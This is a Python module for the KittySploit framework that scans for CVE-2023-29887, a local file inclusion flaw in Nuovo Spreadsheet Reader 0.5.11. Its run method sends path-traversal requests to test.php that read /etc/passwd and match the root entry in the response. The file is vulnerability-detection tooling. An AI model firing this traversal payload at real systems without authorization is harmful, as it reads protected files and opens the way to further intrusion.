#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Local File inclusion vulnerability in test."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nuovo Spreadsheet Reader 0.5.11 - Local File Inclusion Detection',
        'description': 'A Local File inclusion vulnerability in test.php in spreadsheet-reader 0.5.11 allows remote attackers to include arbitrary files via the File parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'nuovo', 'spreadsheet-reader', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://research.hisolutions.com/2023/01/arbitrary-file-read-vulnerability-php-library-nuovo-spreadsheet-reader-0-5-11/',
            'https://github.com/nuovo/spreadsheet-reader/issues/169',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-29887',
        ],
        'cve': 'CVE-2023-29887',
    }

    def run(self):
        for path in ('/spreadsheet-reader/test.php?File=../../../../../../../../../../../etc/passwd', '/nuovo/spreadsheet-reader/test.php?File=../../../../../../../../../../../etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:[x*]:0:0',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Nuovo Spreadsheet Reader 0.5.11 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

